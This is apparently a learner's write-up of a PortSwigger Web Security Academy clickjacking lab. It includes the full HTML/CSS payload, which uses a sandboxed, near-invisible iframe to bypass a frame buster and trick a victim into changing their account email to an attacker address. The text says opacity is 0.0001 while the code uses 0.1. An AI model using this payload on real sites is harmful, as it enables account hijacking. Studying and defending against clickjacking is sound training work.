# PortSwigger Web Security Academy: Clickjacking Lab 3

## Lab Name
Clickjacking with a frame buster script

## How I Solved 
1. **Authenticated:** Logged into the target website using the provided credentials (`wiener`/`peter`) to establish a valid user session.
2. **Crafted Bypass Payload:** Implemented the `sandbox="allow-forms"` attribute within the malicious `iframe` code on the Exploit Server. This blocked the target site's frame buster script from executing.
3. **UI Redressing (Alignment):**
   * Pre-filled the target email input using the `?email=` URL parameter.
   * Created a decoy `<div>Click me</div>` element.
   * Fine-tuned CSS absolute positioning (`top` and `left` properties) to map the fake button accurately onto the hidden "Update email" button.
4. **Made Transparent:** Rendered the iframe entirely invisible to the victim by adjusting the `opacity` to `0.0001`.
5. Final Code Used:
```html
<style>
    iframe {
        position: relative;
        width: 900px;
        height: 700px;
        opacity: 0.1; 
        z-index: 2;
    }
    div {
        position: absolute;
        top: 450px; 
        left: 80px; 
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms"
src="https://0abd00b403ec576b803226e0003100ed.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

6. **Executed Attack:** Stored and delivered the exploit to the victim to trigger the email update.

## What I Learned 
* **Frame Buster Scripts:** Legacy websites often use JavaScript code (Frame Busters) to detect if the page is being loaded inside an `iframe` and force a redirect to the main window to prevent Clickjacking.
* **The Sandbox Bypass:** HTML5 introduced the `sandbox` attribute for iframes. By specifying `sandbox="allow-forms"`, we can explicitly disable JavaScript inside the framed page while still allowing form submissions. This completely neutralizes the JavaScript-based frame buster script.
* **Defense:** Frame buster scripts are unreliable. Modern applications must use robust HTTP defense headers like `X-Frame-Options` or `Content-Security-Policy (CSP) frame-ancestors`.



